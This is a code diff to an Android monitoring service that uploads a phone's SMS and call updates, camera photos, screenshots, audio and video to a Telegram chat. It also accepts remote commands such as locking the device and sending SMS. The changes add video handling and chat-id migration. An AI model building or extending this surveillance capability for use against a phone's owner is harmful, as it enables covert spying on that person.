@@ -477,6 +477,10 @@ class MonitoringService : Service() {
                             flushPendingPhotos()
                         } catch (_: Exception) {
                         }
+                        try {
+                            flushPendingVideos()
+                        } catch (_: Exception) {
+                        }
                         chunkedDelay(syncIntervalMillis())
                     } else {
                         chunkedDelay(15 * 60_000L)
@@ -546,6 +550,21 @@ class MonitoringService : Service() {
             cachedChatId = preferencesManager.chatId
             cachedOwnerId = preferencesManager.ownerUserId
         } catch (_: Exception) {
+        }
+    }
+
+    private fun adoptMigratedChat(errorBody: String?, currentChatId: String): Boolean {
+        val migrated = NetworkUtils.extractMigratedChatId(errorBody) ?: return false
+        if (migrated == currentChatId) return false
+        return try {
+            preferencesManager.chatId = migrated
+            preferencesManager.credentialError = ""
+            preferencesManager.credentialErrorAt = 0L
+            refreshCreds()
+            android.util.Log.i("MonitoringService", "Chat migrated to supergroup, adopting new chat id")
+            true
+        } catch (_: Exception) {
+            false
         }
     }
 
@@ -1343,8 +1362,11 @@ class MonitoringService : Service() {
                 }
             }
             "/restart" -> {
-                sendToTelegram("\u267B\uFE0F Loops restarted.")
-                restartAllLoops()
+                if (restartAllLoops()) {
+                    sendToTelegram("\u267B\uFE0F Loops restarted.")
+                } else {
+                    sendToTelegram("\u23F3\uFE0F Restart throttled, try again shortly.")
+                }
             }
             "/flush" -> {
                 val queued = messageQueue.getQueueSize()
@@ -1361,6 +1383,10 @@ class MonitoringService : Service() {
                         flushPendingPhotos()
                     } catch (_: Exception) {
                     }
+                    try {
+                        flushPendingVideos()
+                    } catch (_: Exception) {
+                    }
                 }
                 val scheduled = MessageScheduler.scheduleMessageSend(this)
                 if (scheduled) {
@@ -1375,7 +1401,7 @@ class MonitoringService : Service() {
                     messageQueue.clearQueue()
                 } catch (_: Exception) {
                 }
-                sendToTelegram("\uD83D\uDDD1\uFE0F Queue cleared ($queued dropped).", null, false)
+                sendToTelegram("\uD83D\uDDD1\uFE0F Queue cleared ($queued dropped). Note: SMS/call updates already marked as seen will not resend.", null, false)
             }
             "/lock" -> {
                 try {
@@ -1614,11 +1640,11 @@ class MonitoringService : Service() {
                 }
             }
             "/storage" -> {
-                val (cacheBytes, cachePhotos, cacheAudios) = withContext(Dispatchers.IO) { cacheStats() }
+                val stats = withContext(Dispatchers.IO) { cacheStats() }
                 sendToTelegram(
                     buildString {
                         appendLine("\uD83D\uDCBE <b>Storage</b>")
-                        appendLine("Cache: " + formatBytes(cacheBytes) + " (" + cachePhotos + " photos, " + cacheAudios + " audio)")
+                        appendLine("Cache: " + formatBytes(stats.bytes) + " (" + stats.photos + " photos, " + stats.audios + " audio, " + stats.videos + " video)")
                         appendLine("Queued: ${messageQueue.getQueueSize()}")
                     }
                 )
@@ -2219,7 +2245,8 @@ class MonitoringService : Service() {
                     sendToTelegram("\uD83D\uDCE9 SMS sent to $number.")
                 } else if (okCount.get() > 0) {
                     preferencesManager.setLastSmsSendAtSync(System.currentTimeMillis())
-                            sendToTelegram("\u26A0\uFE0F SMS partially sent (${okCount.get()}/$expected parts). Check the recipient before retrying; pending kept, try /smsconfirm again.")
+                    preferencesManager.writeSmsPendingSync("", "", 0L, "")
+                            sendToTelegram("\u26A0\uFE0F SMS partially sent (${okCount.get()}/$expected parts). Pending cleared so a retry cannot duplicate the delivered parts; verify with the recipient before sending again.")
                 } else {
                             sendToTelegram("\u26A0\uFE0F SMS not confirmed sent. Pending kept, try /smsconfirm again.")
                 }
@@ -2446,6 +2473,14 @@ class MonitoringService : Service() {
                 return false
             } else if (response.code() == 400) {
                 val goneBody = try { response.errorBody()?.string() } catch (_: Exception) { null }
+                if (adoptMigratedChat(goneBody, chatId)) {
+                    if (queueOnFail) {
+                        messageQueue.addMessage(message)
+                        messageQueue.addMessage("\u267B\uFE0F Group upgraded to supergroup \u2014 chat ID updated automatically.", true)
+                        MessageScheduler.scheduleMessageSend(this)
+                    }
+                    return false
+                }
                 if (NetworkUtils.isChatMissing(goneBody)) {
                     try {
                         preferencesManager.credentialError = response.code().toString()
@@ -2508,6 +2543,14 @@ class MonitoringService : Service() {
                             return false
                         } else if (fallbackResp.code() == 400) {
                             val fbBody = try { fallbackResp.errorBody()?.string() } catch (_: Exception) { null }
+                            if (adoptMigratedChat(fbBody, chatId)) {
+                                if (queueOnFail) {
+                                    messageQueue.addMessage(plain)
+                                    messageQueue.addMessage("\u267B\uFE0F Group upgraded to supergroup \u2014 chat ID updated automatically.", true)
+                                    MessageScheduler.scheduleMessageSend(this)
+                                }
+                                return false
+                            }
                             if (NetworkUtils.isChatMissing(fbBody)) {
                                 try {
                                     preferencesManager.credentialError = fallbackResp.code().toString()
@@ -2982,12 +3025,13 @@ class MonitoringService : Service() {
             val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
             projection = mpm.getMediaProjection(code, data)
             val metrics = DisplayMetrics()
+            val wm = getSystemService(WINDOW_SERVICE) as android.view.WindowManager
             try {
                 @Suppress("DEPRECATION")
-                windowManager.defaultDisplay.getRealMetrics(metrics)
+                wm.defaultDisplay.getRealMetrics(metrics)
             } catch (_: Exception) {
                 @Suppress("DEPRECATION")
-                windowManager.defaultDisplay.getMetrics(metrics)
+                wm.defaultDisplay.getMetrics(metrics)
             }
             var width = metrics.widthPixels
             var height = metrics.heightPixels
@@ -3157,6 +3201,16 @@ class MonitoringService : Service() {
         return "The camera may be in use by another app."
     }
 
+    private fun pendingVideoCount(): Int {
+        return try {
+            cacheDir.listFiles { file ->
+                file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4")
+            }?.size ?: 0
+        } catch (_: Exception) {
+            0
+        }
+    }
+
     private fun pendingPhotoCount(): Int {
         return try {
             cacheDir.listFiles { file ->
@@ -3170,9 +3224,9 @@ class MonitoringService : Service() {
     @Volatile
     private var lastLoopRestartAt = 0L
 
-    private fun restartAllLoops(fromWatchdog: Boolean = false) {
+    private fun restartAllLoops(fromWatchdog: Boolean = false): Boolean {
         val nowRestart = android.os.SystemClock.elapsedRealtime()
-        if (!fromWatchdog && nowRestart - lastLoopRestartAt < 10_000L) return
+        if (!fromWatchdog && nowRestart - lastLoopRestartAt < 10_000L) return false
         lastLoopRestartAt = nowRestart
         try {
             monitoringJob?.cancel()
@@ -3191,6 +3245,7 @@ class MonitoringService : Service() {
         refreshLoopConfig()
         startPeriodicLoops()
         startCommandPolling()
+        startLoopWatchdog()
         try {
             synchronized(initialSyncLock) {
                 try {
@@ -3214,6 +3269,7 @@ class MonitoringService : Service() {
             }
         } catch (_: Exception) {
         }
+        return true
     }
     private fun startLoopWatchdog() {
         try {
@@ -3477,6 +3533,7 @@ class MonitoringService : Service() {
                 } catch (_: Exception) {
                     null
                 }
+                if (adoptMigratedChat(audioErr, chatId)) return MediaSendOutcome.KEPT
                 if (NetworkUtils.isChatMissing(audioErr)) {
                     try {
                         preferencesManager.credentialError = response.code().toString()
@@ -3516,6 +3573,19 @@ class MonitoringService : Service() {
                 sendToTelegram("⚠️ Camera permission missing. Open Setup and grant Camera permission.")
             }
             return
+        }
+        if (pendingVideoCount() >= MAX_VIDEO_KEPT) {
+            try {
+                pruneVideoCache(MAX_VIDEO_KEPT - 1)
+            } catch (_: Exception) {
+            }
+            if (pendingVideoCount() >= MAX_VIDEO_KEPT) {
+                recordBusy.set(false)
+                serviceScope.launch {
+                    sendToTelegram("⚠️ Video backlog full (offline). Oldest unsent kept; newest recording skipped.")
+                }
+                return
+            }
         }
         val attempt = videoAttempt.incrementAndGet()
         videoWatchdog?.cancel()
@@ -3614,11 +3684,12 @@ class MonitoringService : Service() {
                 deleteQuietly(videoFile)
                 return MediaSendOutcome.SENT
             }
-            val errorBody = try {
-                response.errorBody()?.string()?.take(200) ?: ""
+            val errorFull = try {
+                response.errorBody()?.string() ?: ""
             } catch (e: Exception) {
                 ""
             }
+            val errorBody = errorFull.take(200)
             if (response.code() == 429) {
                 val waitSecs = NetworkUtils.parseRetryAfter(errorBody).coerceIn(1L, 300L)
                 mediaBackoffUntil = android.os.SystemClock.elapsedRealtime() + waitSecs * 1000L
@@ -3636,6 +3707,7 @@ class MonitoringService : Service() {
                 } catch (_: Exception) {
                 }
             } else if (response.code() == 400) {
+                if (adoptMigratedChat(errorFull, chatId)) return MediaSendOutcome.KEPT
                 if (NetworkUtils.isChatMissing(errorBody)) {
                     try {
                         preferencesManager.credentialError = response.code().toString()
@@ -3867,10 +3939,13 @@ class MonitoringService : Service() {
         }
     }
 
-    private fun cacheStats(): Triple<Long, Int, Int> {
+    private data class CacheStats(val bytes: Long, val photos: Int, val audios: Int, val videos: Int)
+
+    private fun cacheStats(): CacheStats {
         var bytes = 0L
         var photos = 0
         var audios = 0
+        var videos = 0
         try {
             val top = try { cacheDir.listFiles() } catch (_: Exception) { null } ?: emptyArray()
             for (file in top) {
@@ -3879,13 +3954,14 @@ class MonitoringService : Service() {
                         bytes += file.length()
                         if ((file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg")) photos++
                         if (file.name.startsWith("audio_") && file.name.endsWith(".m4a")) audios++
+                        if (file.name.startsWith("video_") && file.name.endsWith(".mp4")) videos++
                     }
                 } catch (_: Exception) {
                 }
             }
         } catch (_: Exception) {
         }
-        return Triple(bytes, photos, audios)
+        return CacheStats(bytes, photos, audios, videos)
     }
 
     private fun formatBytes(bytes: Long): String {
@@ -3930,11 +4006,12 @@ class MonitoringService : Service() {
                 deleteQuietly(photoFile)
                 return MediaSendOutcome.SENT
             }
-            val errorBody = try {
-                response.errorBody()?.string()?.take(200) ?: ""
+            val errorFull = try {
+                response.errorBody()?.string() ?: ""
             } catch (e: Exception) {
                 ""
             }
+            val errorBody = errorFull.take(200)
             if (response.code() == 429) {
                 val waitSecs = NetworkUtils.parseRetryAfter(errorBody).coerceIn(1L, 300L)
                 mediaBackoffUntil = android.os.SystemClock.elapsedRealtime() + waitSecs * 1000L
@@ -3952,6 +4029,7 @@ class MonitoringService : Service() {
                 } catch (_: Exception) {
                 }
             } else if (response.code() == 400) {
+                if (adoptMigratedChat(errorFull, chatId)) return MediaSendOutcome.KEPT
                 if (NetworkUtils.isChatMissing(errorBody)) {
                     try {
                         preferencesManager.credentialError = response.code().toString()
